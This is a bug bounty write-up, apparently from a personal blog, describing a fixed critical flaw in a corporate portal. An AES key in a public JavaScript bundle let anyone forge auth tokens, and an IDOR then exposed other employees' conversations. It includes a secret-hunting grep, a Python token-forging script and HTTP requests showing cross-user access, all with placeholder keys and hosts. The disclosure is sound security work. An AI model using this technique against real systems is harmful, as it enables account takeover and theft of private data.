---
title:       "Critical: an AES key in a public JavaScript bundle opened every account in the company"
summary:     "A multinational's internal portal signed its tokens with a key anyone could read in a JavaScript file served to the internet. With that key you could mint valid credentials without an account, and the API never checked whose data it was returning. Accepted as critical."
date:        2026-10-16 13:35:00 +0100
lang:        en
ref:         clave-aes-bundle-js
image:       /assets/img/og/clave-aes-bundle-js-en.png
permalink:   /en/writeups/aes-key-in-public-bundle/

severity:    critical
cvss:        "9.1"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
cwe:         "CWE-321 · CWE-639"
vuln_class:  "Authentication"
target_type: "Corporate web portal"
platform:    "YesWeHack"
status:      "Fixed"
reward:      "Rewarded"
tags:        [secrets, cryptography, bola, idor, javascript, authentication, bundle]

takeaways:
  - "Everything that reaches the browser is public. If a key travels to the client, it is no longer a key."
  - "Two medium bugs together make a critical: minting a token is the door, but the damage comes from the API not checking whose data it is."
  - "Hunt the verb before the secret: `encrypt`, `sign`, `secret`, `token` in bundles take you to the function, and the function takes you to the key."
  - "Prove access with your own canary account. Never with a real person's data."
---

Whatever reaches the browser is public, minified or not. Minifying saves bytes; it protects
nothing. I pulled the portal's bundles and grepped for the usual suspects:

```bash
grep -rniE 'secret|api[_-]?key|password|token|private[_-]?key|encrypt|sign' bundles/
```

In one of them:

```javascript
var cfg = {
    system_code: "SRM",
    secret_key:  "a1b2c3d4e5f60718293a4b5c6d7e8f90",   // ← example key
};

function encryptUserTime(data) {
    return CryptoJS.AES.encrypt(
        JSON.stringify(data),
        CryptoJS.enc.Hex.parse(cfg.secret_key),
        { iv: iv, mode: CryptoJS.mode.CBC }
    );
}
```

An AES-256 key served to anyone who opens the site.

## What it was for

A leaked key is worth nothing by itself; what it opens is worth something. Plenty of keys
are public by design — Firebase, payment gateways, map tiles — and reporting those earns
you an informational. So I followed the function.

```javascript
const sig = encryptUserTime({ username: "SRM", timestamp: Date.now(), nonce: "random123" });

fetch("/assistant/auth/v1/app-source/token", {
    method:  "POST",
    headers: { "X-System-Code": "SRM" },
    body:    JSON.stringify({ signature: sig })
});
```

The server decrypts that and concludes "you are my legitimate application". But the key came
in the file I had downloaded, so I can encrypt it too. It is not checking who you are: it is
checking that you hold a secret it has handed to everybody.

<figure>
  <img src="{{ '/assets/img/writeups/clave-aes-bundle-js/02-clave-en-el-navegador-en.svg' | relative_url }}"
       alt="Diagram: the server sends the JavaScript file with the key inside to both the legitimate browser and the attacker, and both can sign valid requests">
  <figcaption>The same file reaches both. And with it, the same key.</figcaption>
</figure>

## Minting the pass

```python
import json, time, base64, os
from Crypto.Cipher import AES

KEY = bytes.fromhex("a1b2c3d4e5f60718293a4b5c6d7e8f90")   # example
iv  = os.urandom(16)

plain = json.dumps({
    "username":  "SRM",
    "timestamp": int(time.time() * 1000),
    "nonce":     "bbtest1234567",
}).encode()

pad = 16 - len(plain) % 16
ct  = AES.new(KEY, AES.MODE_CBC, iv).encrypt(plain + bytes([pad]) * pad)
sig = base64.b64encode(iv + ct).decode()
```

```http
POST /assistant/auth/v1/app-source/token HTTP/2
Host: portal.example.tld
X-System-Code: SRM

{"signature":"<the signature I just minted>"}
```

```http
HTTP/2 200 OK

{"code":"000000","data":{"access_token":"eyJhbGciOi..."}}
```

<figure>
  <img src="{{ '/assets/img/writeups/clave-aes-bundle-js/01-token-sin-cuenta.png' | relative_url }}"
       alt="Burp Repeater: the request carries only Content-Type, the system code and the signature; there is no Authorization header and no cookie. The response is 200 with an access_token">
  <figcaption>No <code>Authorization</code> header and no cookie: just the signature I minted. The response carries the token.</figcaption>
</figure>

<figure>
  <img src="{{ '/assets/img/writeups/clave-aes-bundle-js/03-jwt-decodificado.png' | relative_url }}"
       alt="The same token decoded in a JWT viewer: the payload shows the scope field with the value read write, highlighted">
  <figcaption>The same token, decoded: <code>scope: "read write"</code>.</figcaption>
</figure>

Read and write, with no account.

## The second bug, the one that hurts

A token is not anybody's data. It should only work for mine. I asked for someone else's:

```http
POST /assistant/chat/v1/get_conversation HTTP/2
Host: portal.example.tld
X-Authorization: <my minted token>

{"user":"target.employee"}
```

<figure>
  <img src="{{ '/assets/img/writeups/clave-aes-bundle-js/04-datos-de-otro.png' | relative_url }}"
       alt="Request with the minted token and another employee's name in the body. The response returns conversations whose userId is that same employee, and the search counts 300 matches">
  <figcaption>Just write someone else's name in the body. The response brings their conversations — the <code>userId</code> is theirs, not mine — and the search counts <strong>300</strong>. The real username is covered; it is a person.</figcaption>
</figure>

The token does not say who I am, and the API, instead of deriving that from it, lets me
write it in the body myself. That is BOLA, or IDOR: it checks that you got in, not that what
you ask for is yours.

The finding is not the key. It is the combination:

| Piece | On its own | Combined |
|---|---|---|
| Key in the bundle | Maybe it only signs anonymous requests | Lets you mint passes |
| Token not bound to a user | You still need a token | You get in as anyone |
| API takes the username from the body | Bad design | **You read any employee's data** |

## Where I stopped

I could have downloaded hundreds of employees' conversations. I did not: showing the door
opens does not require emptying the house. Writes were tested against a conversation of my
own, with a random identifier. Nothing that appeared on screen was kept, and it is redacted
in the report.

The same path turned up an endpoint that returned an external paid service's key with no
authentication. I reported it redacted, without using it.

## Impact

<div class="impact" markdown="1">
Anyone with a browser could mint a valid pass — the key sat in a file served to the
internet — and use it to **read any employee's conversations** by naming their username in
the request body. No account, no password, and nobody granting them anything.

This is not metadata: it is the full messages, their attachments and the files people had
uploaded to the internal assistant. On a corporate portal that means private
correspondence, work documents and whatever anyone pasted into a chat believing it was
internal.

The same pass also allowed **writes**: renaming and deleting other people's conversations.
And along the same path, an external paid service's key was exposed with no authentication
at all.

Rated **critical (CVSS 9.1)**, and accepted as such.
</div>
